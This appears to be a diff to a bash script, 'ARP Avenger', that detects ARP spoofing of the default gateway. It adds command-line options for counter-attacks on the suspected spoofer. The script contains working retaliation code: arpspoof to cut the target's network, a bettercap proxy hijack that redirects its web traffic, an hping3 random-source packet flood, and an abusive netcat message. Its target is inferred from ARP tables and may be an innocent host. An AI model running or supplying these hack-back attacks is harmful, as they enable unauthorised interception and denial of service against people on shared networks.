@@ -1,76 +1,123 @@
 #!/bin/bash
-# ARP Avenger - Detect & Retaliate Against ARP Spoofers
-# Requires: arp-scan, arpspoof (dsniff), hping3, terminal-notifier, bettercap, netcat
-# Author: Fiend's Wrath Edition
+# ARP Avenger - Fiend's Wrath + Smart Detection
+# Requires: arp-scan, arpspoof (dsniff), hping3, terminal-notifier, bettercap
 
-### CONFIG ###
-INTERFACE="en0"  # Change to your network interface
-SCAN_INTERVAL=10 # Seconds between scans
-GATEWAY_IP=$(netstat -rn | awk '/default/ {print $2; exit}') # Auto-detect default gateway
-
-# Reaction toggles
-just_alert=true
-send_message=false
+### DEFAULT CONFIG ###
+INTERFACE="en0"
+SCAN_INTERVAL=10
 MESSAGE="Stop ARP spoofing, asshole. You've been caught."
-drop_network=false
-rickroll=false
-first_strike=false
-hping_flood=false
 
-# Temp scan files
-SCAN_FILE=$(mktemp)
-PREVIOUS_FILE=$(mktemp)
+# Mode toggles
+JUST_ALERT=true
+SEND_MESSAGE=false
+DROP_NETWORK=false
+RICKROLL=false
+FIRST_STRIKE=false
+HPING_FLOOD=false
 
-# Cleanup on Ctrl+C
+### FUNCTIONS ###
+show_help() {
+    cat <<EOF
+ARP Avenger - Fiend's Wrath Edition with Smart Detection
+Usage: $0 [options]
+
+Options:
+  --just-alert         Only notify (default: true)
+  --send-message       Send revenge message to attacker
+  --message "TEXT"     Set custom message text
+  --drop-network       Drop attacker's network access
+  --rickroll           Redirect attacker to Rickroll
+  --first-strike       Immediate ARP nuke on attacker
+  --hping-flood        Flood attacker with packets
+  --interface enX      Set network interface (default: $INTERFACE)
+  --interval SECONDS   Set scan interval (default: $SCAN_INTERVAL)
+  --help               Show this help menu
+
+Example:
+  $0 --rickroll --send-message --message "Surprise, motherf****r"
+EOF
+}
+
 cleanup() {
-    echo -e "\n[*] Stopping all active counter-attacks..."
-    pkill -f arpspoof >/dev/null 2>&1
-    pkill -f hping3 >/dev/null 2>&1
-    pkill -f bettercap >/dev/null 2>&1
-    rm -f "$SCAN_FILE" "$PREVIOUS_FILE"
-    echo "[*] Cleanup complete. Exiting."
+    echo -e "\n[*] Stopping all active attacks and exiting..."
+    pkill -f arpspoof
+    pkill -f hping3
+    pkill -f bettercap
     exit 0
 }
 trap cleanup INT
 
-echo "[*] ARP Avenger starting on $INTERFACE (Gateway: $GATEWAY_IP)"
+get_network_fingerprint() {
+    GATEWAY_IP=$(netstat -rn | awk '/default/ {print $2; exit}')
+    GATEWAY_MAC=$(arp -n $GATEWAY_IP | awk '{print $4}')
+    LOCAL_IP=$(ipconfig getifaddr "$INTERFACE")
+    SUBNET=$(echo "$LOCAL_IP" | cut -d'.' -f1-3)
+}
+
+### PARSE ARGS ###
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        --just-alert) JUST_ALERT=true ;;
+        --send-message) SEND_MESSAGE=true ;;
+        --message) MESSAGE="$2"; shift ;;
+        --drop-network) DROP_NETWORK=true ;;
+        --rickroll) RICKROLL=true ;;
+        --first-strike) FIRST_STRIKE=true ;;
+        --hping-flood) HPING_FLOOD=true ;;
+        --interface) INTERFACE="$2"; shift ;;
+        --interval) SCAN_INTERVAL="$2"; shift ;;
+        --help) show_help; exit 0 ;;
+        *) echo "Unknown option: $1"; show_help; exit 1 ;;
+    esac
+    shift
+done
+
+### INITIAL BASELINE ###
+get_network_fingerprint
+BASE_GATEWAY_IP="$GATEWAY_IP"
+BASE_GATEWAY_MAC="$GATEWAY_MAC"
+BASE_SUBNET="$SUBNET"
+
+echo "[*] Starting ARP Avenger - Fiend's Wrath with Smart Detection on $INTERFACE"
+echo "[*] Baseline network: Subnet=$BASE_SUBNET, Gateway IP=$BASE_GATEWAY_IP, Gateway MAC=$BASE_GATEWAY_MAC"
 echo "[*] Press Ctrl+C to stop."
 
-# Initial scan
-sudo arp -a > "$PREVIOUS_FILE"
-
 while true; do
-    sudo arp -a > "$SCAN_FILE"
+    get_network_fingerprint
 
-    OLD_MAC=$(grep "$GATEWAY_IP" "$PREVIOUS_FILE" | awk '{print $4}')
-    NEW_MAC=$(grep "$GATEWAY_IP" "$SCAN_FILE" | awk '{print $4}')
+    # Check if network changed
+    if [[ "$SUBNET" != "$BASE_SUBNET" || "$GATEWAY_IP" != "$BASE_GATEWAY_IP" ]]; then
+        echo "[*] Network change detected. Re-baselining..."
+        BASE_SUBNET="$SUBNET"
+        BASE_GATEWAY_IP="$GATEWAY_IP"
+        BASE_GATEWAY_MAC="$GATEWAY_MAC"
+        echo "[*] New baseline: Subnet=$BASE_SUBNET, Gateway IP=$BASE_GATEWAY_IP, Gateway MAC=$BASE_GATEWAY_MAC"
+        sleep $SCAN_INTERVAL
+        continue
+    fi
 
-    if [ "$OLD_MAC" != "$NEW_MAC" ]; then
-        echo "[!] ALERT: Default Gateway MAC changed!"
-        echo "    Old MAC: $OLD_MAC"
-        echo "    New MAC: $NEW_MAC"
+    # Same network, but MAC changed → Attack!
+    if [[ "$GATEWAY_MAC" != "$BASE_GATEWAY_MAC" ]]; then
+        echo "[!] Gateway MAC changed! Possible ARP spoof!"
+        echo "Old MAC: $BASE_GATEWAY_MAC"
+        echo "New MAC: $GATEWAY_MAC"
 
-        ATTACKER_MAC="$NEW_MAC"
-        ATTACKER_IP=$(grep "$ATTACKER_MAC" "$SCAN_FILE" | awk '{print $2}' | sed 's/[()]//g')
+        ATTACKER_MAC="$GATEWAY_MAC"
+        ATTACKER_IP=$(arp -an | grep "$ATTACKER_MAC" | awk '{print $2}' | sed 's/[()]//g')
+        echo "[*] Attacker: IP=$ATTACKER_IP MAC=$ATTACKER_MAC"
 
-        echo "[*] Suspected Attacker: IP=$ATTACKER_IP MAC=$ATTACKER_MAC"
-
-        # --- Reaction Actions ---
-        if [ "$just_alert" = true ]; then
+        if [ "$JUST_ALERT" = true ]; then
             terminal-notifier -title "ARP Avenger Alert" -message "Gateway spoof from $ATTACKER_IP ($ATTACKER_MAC)"
         fi
-
-        if [ "$drop_network" = true ]; then
-            echo "[*] Dropping network access for $ATTACKER_IP..."
+        if [ "$DROP_NETWORK" = true ]; then
+            echo "[*] Dropping network for $ATTACKER_MAC..."
             sudo arpspoof -i "$INTERFACE" -t "$ATTACKER_IP" 0.0.0.0 >/dev/null 2>&1 &
         fi
-
-        if [ "$send_message" = true ]; then
-            echo "[*] Sending message to attacker..."
+        if [ "$SEND_MESSAGE" = true ]; then
+            echo "[*] Sending revenge message..."
             echo "$MESSAGE" | nc -w 3 "$ATTACKER_IP" 4444
         fi
-
-        if [ "$rickroll" = true ]; then
+        if [ "$RICKROLL" = true ]; then
             echo "[*] Rickrolling $ATTACKER_IP..."
             RICKROLL_CAP="/tmp/rickroll_${ATTACKER_IP}.cap"
             cat > "$RICKROLL_CAP" <<EOF
@@ -83,7 +130,6 @@ http.server on
 set http.proxy.script /tmp/rickroll.js
 http.proxy on
 EOF
-
             cat > /tmp/rickroll.js <<EOF
 function onRequest(req, res) {
     res.status = 302;
@@ -93,20 +139,16 @@ function onRequest(req, res) {
 }
 EOF
             sudo bettercap -iface "$INTERFACE" -caplet "$RICKROLL_CAP" >/dev/null 2>&1 &
-            echo "[+] Rickroll launched."
         fi
-
-        if [ "$first_strike" = true ]; then
+        if [ "$FIRST_STRIKE" = true ]; then
             echo "[*] FIRST STRIKE: Nuking $ATTACKER_IP..."
             sudo arpspoof -i "$INTERFACE" -t "$ATTACKER_IP" 0.0.0.0 >/dev/null 2>&1 &
         fi
-
-        if [ "$hping_flood" = true ]; then
-            echo "[*] Flooding $ATTACKER_IP with packets..."
+        if [ "$HPING_FLOOD" = true ]; then
+            echo "[*] Flooding $ATTACKER_IP..."
             sudo hping3 --flood --rand-source "$ATTACKER_IP" >/dev/null 2>&1 &
         fi
     fi
 
-    cp "$SCAN_FILE" "$PREVIOUS_FILE"
     sleep $SCAN_INTERVAL
 done
